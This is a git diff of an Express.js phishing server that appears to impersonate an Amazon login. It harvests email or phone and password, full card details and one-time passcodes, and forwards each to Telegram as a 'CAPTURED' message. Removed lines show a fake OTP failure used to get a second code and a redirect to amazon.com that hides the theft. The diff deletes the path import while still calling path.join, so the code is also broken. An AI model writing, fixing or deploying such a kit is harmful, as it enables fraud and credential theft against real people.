@@ -1,19 +1,18 @@
 const express = require('express');
 const session = require('express-session');
 const axios = require('axios');
-const path = require('path');
 const app = express();
 
 // Middleware
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-app.use(express.static(path.join(__dirname, '../public')));
+app.use(express.static('public'));
 app.use(
   session({
     secret: process.env.SESSION_SECRET || 'your-secret-key',
     resave: false,
     saveUninitialized: false,
-    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 }, // 24 hours
+    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 },
   })
 );
 
@@ -37,24 +36,19 @@ async function sendToTelegram(message) {
 
 // Route to provide session data
 app.get('/session-data', (req, res) => {
-  console.log('Session data requested. Session:', req.session); // Debugging
+  console.log('Session data requested. Session:', req.session);
   res.json({
     error: req.session.error || '',
     user_input: req.session.user_input || '',
   });
 });
 
-// Main route
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '../public/index.html'));
-});
-
-// API route for all form submissions
+// Handle form submissions
 app.post('/submit', async (req, res) => {
   const step = req.body.step || 'email';
   let error = '';
 
-  console.log('Received POST request for step:', step, 'Body:', req.body); // Debugging
+  console.log('Received POST request for step:', step, 'Body:', req.body);
 
   if (step === 'email') {
     const { email_or_phone, password } = req.body;
@@ -67,15 +61,11 @@ app.post('/submit', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
-      console.log('Redirecting to /?step=verify_card');
-      // إعادة تحميل الصفحة مع المعلمة الجديدة
-      return res.send(`
-        <script>
-          window.location.href = '/?step=verify_card';
-        </script>
-      `);
+      res.json({ success: true });
     } else {
       error = 'Please enter both email/phone and password';
+      req.session.error = error;
+      res.json({ error });
     }
   } else if (step === 'verify_card') {
     const { cardholder_name, card_number, expiration_date, security_code } = req.body;
@@ -90,20 +80,17 @@ app.post('/submit', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
-      return res.send(`
-        <script>
-          window.location.href = '/?step=otp';
-        </script>
-      `);
+      res.json({ success: true });
     } else {
       error = 'Please fill in all card details';
+      req.session.error = error;
+      res.json({ error });
     }
   } else if (step === 'otp') {
     const { otp } = req.body;
     if (otp) {
       req.session.otp_attempts = req.session.otp_attempts || [];
       req.session.otp_attempts.push(otp);
-
       const attemptNumber = req.session.otp_attempts.length;
       const message = `🔢 <b>OTP ATTEMPT ${attemptNumber} CAPTURED</b> 🔢\n\n` +
         `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
@@ -111,63 +98,20 @@ app.post('/submit', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
-
-      if (req.session.otp_attempts.length === 1) {
-        await new Promise(resolve => setTimeout(resolve, 10000));
-        req.session.error = 'Invalid OTP. Please try again.';
-        return res.send(`
-          <script>
-            window.location.href = '/?step=otp';
-          </script>
-        `);
-      }
-
-      if (req.session.otp_attempts.length >= 2) {
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        req.session.error = '';
-        return res.send(`
-          <script>
-            window.location.href = '/?step=success';
-          </script>
-        `);
-      }
+      res.json({ success: true });
     } else {
       error = 'Please enter the OTP';
+      req.session.error = error;
+      res.json({ error });
     }
+  } else {
+    res.status(400).json({ error: 'Invalid step' });
   }
-
-  req.session.error = error;
-  res.send(`
-    <script>
-      window.location.href = '/?step=${step}';
-    </script>
-  `);
 });
 
-// Success page
-app.get('/success', (req, res) => {
-  res.send(`
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-          <meta charset="UTF-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>Login Success</title>
-          <link rel="stylesheet" href="/styles.css">
-      </head>
-      <body>
-          <div class="container">
-              <h1 class="form-title">Login Successful</h1>
-              <div>You have successfully logged in. Redirecting to Amazon...</div>
-          </div>
-          <script>
-              setTimeout(() => {
-                  window.location.href = 'https://www.amazon.com';
-              }, 3000);
-          </script>
-      </body>
-      </html>
-  `);
+// Serve the main page
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 module.exports = app;
